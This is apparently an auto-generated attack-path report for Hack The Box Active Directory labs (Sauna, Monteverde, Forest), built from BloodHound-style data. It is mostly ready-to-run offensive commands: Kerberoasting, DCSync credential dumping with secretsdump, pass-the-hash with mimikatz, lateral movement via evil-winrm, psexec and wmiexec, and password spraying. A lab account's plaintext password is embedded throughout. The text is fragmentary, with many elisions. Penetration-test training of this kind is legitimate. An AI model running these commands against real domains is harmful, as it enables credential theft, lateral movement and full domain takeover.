...
**Generated:** 2026-01-03 00:55:22

---

## Data Inventory

**Domains:** EGOTISTICAL-BANK, EGOTISTICAL-BANK.LOCAL, HTB.LOCAL, HTB.LOCAL, MEGABANK.LOCAL

| Type | Count | Details |
|------|-------|---------|
| Users | 88 | 50 enabled |
| Computers | 6 | EXCH01.HTB.LOCAL, EXCH01.HTB.LOCAL, FOREST.HTB.LOCAL |
| Groups | 271 | ACCOUNT OPERATORS@EGOTISTICAL-BANK.LOCAL, ACCOUNT OPERATORS@HTB.LOCAL, ACCOUNT OPERATORS@HTB.LOCAL |

**Relationships:** GenericAll: 949 | WriteDacl: 695 | MemberOf: 165 | DCSync: 17 | AdminTo: 6 | CanPSRemote: 3
...
| Discovered | Domain | Warnings | Info | Ready Command |
|------|--------|----------|--------|---------------|
| HSMITH@EGOTISTICAL-BANK.LOCAL | EGOTISTICAL-BANK.LOCAL |  | Kerberoast - request TGS for offline cracking | `impacket-GetUserSPNs -request -dc-ip 10.10.10.175 egotistical-bank.local/SVC_LOANMGR:"Moneymakestheworldgoround!"` |
...
|  | MONTEVERDE.MEGABANK.LOCAL |  | Unconstrained delegation - monitor for TGT capture | `Rubeus.exe monitor /interval:5 /nowrap /targetuser:<TARGET_USER>` |
...
| ADMINISTRATOR@MEGABANK.LOCAL | MONTEVERDE.MEGABANK.LOCAL |  | ADMINISTRATOR has local admin rights on MONTEVERDE | `impacket-psexec 'megabank.local/ADMINISTRATOR:<PASSWORD>@MONTEVERDE.MEGABANK.LOCAL'` |
...
| SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL | SAUNA.EGOTISTICAL-BANK.LOCAL |  | SVC_LOANMGR has PSRemote/WinRM access to SAUNA | `evil-winrm -i 10.10.10.175 -u SVC_LOANMGR -p Moneymakestheworldgoround!` |
| MHOPE@MEGABANK.LOCAL | MONTEVERDE.MEGABANK.LOCAL |  | MHOPE has PSRemote/WinRM access to MONTEVERDE | `evil-winrm -i MONTEVERDE.MEGABANK.LOCAL -u MHOPE -p <PASSWORD>` |
...
| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL | DC01.EGOTISTICAL-BANK.LOCAL | [PARTIAL RIGHTS] | SVC_LOANMGR has DCSync rights (GetChanges+GetChangesAll) | `impacket-secretsdump -just-dc-user <TARGET_USER> 'egotistical-bank.local/SVC_LOANMGR:Moneymakestheworldgoround!@10.10.10.175'` |
...
| User | Target | Warnings | Reason | Ready Command |
|------|--------|----------|--------|---------------|
| SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL | EGOTISTICAL-BANK.LOCAL |  | SVC_LOANMGR has DCSync rights (GetChanges+GetChangesAll) | `impacket-secretsdump -just-dc-user <TARGET_USER> 'egotistical-bank.local/SVC_LOANMGR:Moneymakestheworldgoround!@10.10.10.175'` |
...
| MONTEVERDE.MEGABANK.LOCAL |  | Windows Server 2019 Standard |  |
...
**OSCP Relevance:** MEDIUM | **Results:** 48
...
| ADMINISTRATOR@MEGABANK.LOCAL | True | Built-in account for administering the computer/domain |
...
| SMORGAN@MEGABANK.LOCAL | False |  |
| ROLEARY@MEGABANK.LOCAL | False |  |
| AAD_987D7F2F57D2@MEGABANK.LOCAL | False | Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE. |
| DGALANOS@MEGABANK.LOCAL | False |  |
| SVC-ATA@MEGABANK.LOCAL | False |  |
| SABATCHJOBS@MEGABANK.LOCAL | False |  |
| SVC-BEXEC@MEGABANK.LOCAL | False |  |
| MHOPE@MEGABANK.LOCAL | False |  |
| SVC-NETAPP@MEGABANK.LOCAL | False |  |

### [OK] Accounts That Never Logged In
**OSCP Relevance:** MEDIUM | **Results:** 34
...
| AUTHENTICATED USERS@MEGABANK.LOCAL | ['Group'] | PRE-WINDOWS 2000 COMPATIBLE ACCESS@MEGABANK.LOCAL |
...
| --- | --- | --- | --- |
| SAUNA.EGOTISTICAL-BANK.LOCAL | 10.10.10.175 | ['DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL', 'ENTERPRISE ADMINS@EGOTISTICAL-BANK.LOCAL', 'ADMINISTRATOR@EGOTISTICAL-BANK.LOCAL'] | 3 |
| MONTEVERDE.MEGABANK.LOCAL |  | ['DOMAIN ADMINS@MEGABANK.LOCAL', 'ADMINISTRATOR@MEGABANK.LOCAL', 'ENTERPRISE ADMINS@MEGABANK.LOCAL'] | 3 |
...
| MHOPE@MEGABANK.LOCAL | ['MONTEVERDE.MEGABANK.LOCAL'] | [] | 1 |
...
| --- | --- | --- | --- |
| SAUNA.EGOTISTICAL-BANK.LOCAL | 10.10.10.175 | 3 | ['DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL', 'ENTERPRISE ADMINS@EGOTISTICAL-BANK.LOCAL', 'ADMINISTRATOR@EGOTISTICAL-BANK.LOCAL'] |
| MONTEVERDE.MEGABANK.LOCAL |  | 3 | ['DOMAIN ADMINS@MEGABANK.LOCAL', 'ADMINISTRATOR@MEGABANK.LOCAL', 'ENTERPRISE ADMINS@MEGABANK.LOCAL'] |
...
### [OK] DCSync Rights
**OSCP Relevance:** HIGH | **Results:** 22
...
| DOMAIN CONTROLLERS@MEGABANK.LOCAL | ['Group'] | GetChangesAll |
| ADMINISTRATORS@MEGABANK.LOCAL | ['Group'] | GetChangesAll |
| ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@MEGABANK.LOCAL | ['Group'] | GetChanges |
| ENTERPRISE DOMAIN CONTROLLERS@MEGABANK.LOCAL | ['Group'] | GetChanges |
| ADMINISTRATORS@MEGABANK.LOCAL | ['Group'] | GetChanges |
...
| KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | SM_75A538D3025E4DB9A@HTB.LOCAL | ['User', 'Base'] |
| ENTERPRISE KEY ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | SM_75A538D3025E4DB9A@HTB.LOCAL | ['User', 'Base'] |
...
| DOMAIN ADMINS@MEGABANK.LOCAL | KRBTGT@MEGABANK.LOCAL | ['User'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | ADMINISTRATOR@MEGABANK.LOCAL | ['User'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | FILE SERVER ADMINS@MEGABANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | CALL RECORDING ADMINS@MEGABANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | AZURE ADMINS@MEGABANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | ADSYNCADMINS@MEGABANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | ENTERPRISE KEY ADMINS@MEGABANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | KEY ADMINS@MEGABANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@MEGABANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | READ-ONLY DOMAIN CONTROLLERS@MEGABANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | CLONEABLE DOMAIN CONTROLLERS@MEGABANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | ACCOUNT OPERATORS@MEGABANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | SERVER OPERATORS@MEGABANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | DOMAIN GUESTS@MEGABANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | DOMAIN ADMINS@MEGABANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | DOMAIN USERS@MEGABANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | ENTERPRISE ADMINS@MEGABANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | SCHEMA ADMINS@MEGABANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | DOMAIN CONTROLLERS@MEGABANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@MEGABANK.LOCAL | DOMAIN COMPUTERS@MEGABANK.LOCAL | ['Group'] |
| ADMINISTRATORS@MEGABANK.LOCAL | STORAGE REPLICA ADMINISTRATORS@MEGABANK.LOCAL | ['Group'] |
...
| ADMINISTRATOR@MEGABANK.LOCAL | True | True |
...
| Windows Server 2019 Standard | ['MONTEVERDE.MEGABANK.LOCAL'] | 1 |
...
**OSCP Relevance:** MEDIUM | **Results:** 16
...
| HEALTHMAILBOXC3D7722@HTB.LOCAL | 6 years ago |  |
| MHOPE@MEGABANK.LOCAL | 6 years ago |  |
| ADMINISTRATOR@HTB.LOCAL | 5 days ago | Built-in account for administering the computer/domain |
| ADMINISTRATOR@HTB.LOCAL | 5 days ago | Built-in account for administering the computer/domain |
| SVC-ALFRESCO@HTB.LOCAL | 4 days ago |  |
| SVC-ALFRESCO@HTB.LOCAL | 4 days ago |  |
| ADMINISTRATOR@EGOTISTICAL-BANK.LOCAL | 3 days ago | Built-in account for administering the computer/domain |
| FSMITH@EGOTISTICAL-BANK.LOCAL | 2 days ago |  |
| AAD_987D7F2F57D2@MEGABANK.LOCAL | 11 hours ago | Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE. |
| SABATCHJOBS@MEGABANK.LOCAL | In the future |  |
| ADMINISTRATOR@MEGABANK.LOCAL | In the future | Built-in account for administering the computer/domain |
...
| MemberOf | 330 |
| AddMember | 310 |
| AddKeyCredentialLink | 300 |
| OwnsRaw | 280 |
| AllExtendedRights | 216 |
| Contains | 190 |
...
**OSCP Relevance:** HIGH | **Results:** 36
...
| ACCOUNT OPERATORS@MEGABANK.LOCAL | ['Group'] | Members can administer domain user and group accounts |
...
| ADMINISTRATORS@MEGABANK.LOCAL | ['Group'] | Administrators have complete and unrestricted access to the computer/domain |
...
| BACKUP OPERATORS@MEGABANK.LOCAL | ['Group'] | Backup Operators can override security restrictions for the sole purpose of backing up or restoring files |
...
| DOMAIN ADMINS@MEGABANK.LOCAL | ['Group'] | Designated administrators of the domain |
...
| DOMAIN CONTROLLERS@MEGABANK.LOCAL | ['Group'] | All domain controllers in the domain |
...
| ENTERPRISE ADMINS@MEGABANK.LOCAL | ['Group'] | Designated administrators of the enterprise |
...
| PRINT OPERATORS@MEGABANK.LOCAL | ['Group'] | Members can administer printers installed on domain controllers |
...
| SERVER OPERATORS@MEGABANK.LOCAL | ['Group'] | Members can administer domain servers |
...
- **Owns Relationships on Users/Groups**: 100 results (Privilege Escalation)
...
- **High-Value Target Summary**: 36 results (Operational)
- **AddMember to Privileged Groups**: 24 results (Privilege Escalation)
- **DCSync Rights**: 22 results (Privilege Escalation)
- **AS-REP Roastable Users**: 3 results (Quick Wins)
- **Unconstrained Delegation Systems**: 3 results (Quick Wins)
- **PSRemote Access (Evil-WinRM Targets)**: 3 results (Lateral Movement)
...
| Attack | Reason | Command |
|--------|--------|---------|
| DCSync | GetChanges+GetChangesAll | `impacket-secretsdump 'egotistical-bank.local/SVC_LOANMGR:Moneymakestheworldgoround!'@DC01.EGOTISTICAL-BANK.LOCAL` |
...
| Technique | Command |
|-----------|---------|
| evil-winrm | `evil-winrm -i 10.10.10.175 -u SVC_LOANMGR -p 'Moneymakestheworldgoround!'` |
| winrs | `winrs -r:10.10.10.175 -u:egotistical-bank.local\SVC_LOANMGR -p:Moneymakestheworldgoround! cmd` |
...
### SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL
**Credential:** password = `Moneymakestheworldgoround!`
...
```
mimikatz.exe "sekurlsa::pth /user:SVC_LOANMGR /domain:egotistical-bank.local /ntlm:<HASH> /run:cmd.exe"
```
...
type \\TARGET.domain.com\C$\Users\Administrator\Desktop\proof.txt
PsExec.exe \\TARGET.domain.com cmd.exe
```

**Kali:**
```bash
impacket-smbclient -k -no-pass TARGET.domain.com
impacket-psexec -k -no-pass user@TARGET.domain.com
impacket-secretsdump -k -no-pass user@TARGET.domain.com
```

**5. VERIFY ACCESS CHANGES**

```bash
crackmapexec smb TARGET.egotistical-bank.local -u <USER> -p '<PASS>' --shares
crackmapexec smb TARGET.egotistical-bank.local -k --shares  # With Kerberos ticket
```
...
#### DCOM Lateral Movement (Fileless)
...
echo -e "MONTEVERDE" > targets_g1.txt
...
```bash
# WinRM (evil-winrm)
evil-winrm -i MONTEVERDE -u administrator -p '<PASSWORD>'
```

```bash
# PSExec
impacket-psexec 'HTB/administrator:<PASSWORD>'@MONTEVERDE
```

```bash
# WMIExec
impacket-wmiexec 'HTB/administrator:<PASSWORD>'@MONTEVERDE
```

## PS Remoting (CanPSRemote)

3 users, 2 unique target groups
...
```bash
# Create user and target files
echo -e "mhope" > users_g2.txt
echo -e "MONTEVERDE" > targets_g2.txt
...
```bash
# WinRM (CrackMapExec)
crackmapexec winrm MONTEVERDE -u mhope -p '<PASSWORD>'
```
...
```
  ...
  3 users via CanPSRemote (WinRM → evil-winrm auth)
...
# --- administrator → MONTEVERDE (MONTEVERDE) ---
# AdminTo (direct): MATCH (administrator)-[:AdminTo]->(MONTEVERDE)
crackmapexec smb MONTEVERDE -u administrator -p "$PASSWORD"

# --- fsmith → 10.10.10.175 (SAUNA) ---
# CanPSRemote (direct): MATCH (fsmith)-[:CanPSRemote]->(SAUNA)
evil-winrm -i 10.10.10.175 -u fsmith -p "$PASSWORD"

# --- mhope → MONTEVERDE (MONTEVERDE) ---
# CanPSRemote (direct): MATCH (mhope)-[:CanPSRemote]->(MONTEVERDE)
evil-winrm -i MONTEVERDE -u mhope -p "$PASSWORD"
...
```bash
crackmapexec smb 10.10.10.175 -u users.txt -p 'Moneymakestheworldgoround!' -d htb.local --continue-on-success
```
```bash
...
```bash
kerbrute passwordspray -d htb.local --dc 10.10.10.175 users.txt 'Moneymakestheworldgoround!'
```
```bash
...
```bash
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Moneymakestheworldgoround!' -Verbose
```
```bash
...
```bash
ldapsearch -x -H ldap://10.10.10.175 -D 'htb.local\SVC_LOANMGR' -w '<PASSWORD>' -b '<DOMAIN_DN>' '(objectClass=user)' sAMAccountName | grep sAMAccountName | cut -d' ' -f2 > users.txt
```

**CME user enumeration (authenticated)**
```bash
crackmapexec smb 10.10.10.175 -u 'SVC_LOANMGR' -p '<PASSWORD>' -d htb.local --users | awk '{print $5}' | grep -v '\[' > users.txt
```
...
```bash
rpcclient -U 'SVC_LOANMGR%<PASSWORD>' 10.10.10.175 -c 'enumdomusers' | grep -oP '\[.*?\]' | tr -d '[]' | cut -d' ' -f1 > users.txt
```
